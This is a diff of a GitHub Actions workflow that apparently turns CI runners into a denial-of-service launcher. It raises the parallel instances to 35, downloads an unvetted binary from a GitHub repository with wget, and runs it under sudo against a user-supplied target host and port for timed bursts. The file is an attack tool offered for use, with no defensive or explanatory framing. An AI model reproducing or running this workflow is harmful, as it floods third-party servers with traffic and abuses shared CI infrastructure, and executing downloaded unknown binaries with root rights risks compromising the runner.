@@ -1,4 +1,4 @@
-name: Tekil !
+name: OVH !
 
 on:
   workflow_dispatch:
@@ -18,7 +18,7 @@ jobs:
     strategy:
       max-parallel: 35
       matrix:
-        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]
+        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35]
 
     steps:
       - name: Checkout (optional)
@@ -29,20 +29,12 @@ jobs:
           TARGET="${{ inputs.target }}"
           PORT="${{ inputs.port }}"
           
-          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O Tekil
-          chmod +x Tekil || true
-
-          PIDS=()
-          for i in {1..2}; do
-            sudo timeout 30 ./Tekil "$TARGET" "$PORT" &
-            PIDS+=($!)
-          done
-
-          for pid in "${PIDS[@]}"; do
-            wait $pid
-          done
-
+          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/ovhand -O OVH
+          chmod +x OVH || true
+          
+          sudo timeout 45 ./OVH "$TARGET" "$PORT" 4 45 &
+          
       - name: Finish !
         run: |
-          sleep 30
+          sleep 45
           exit 0
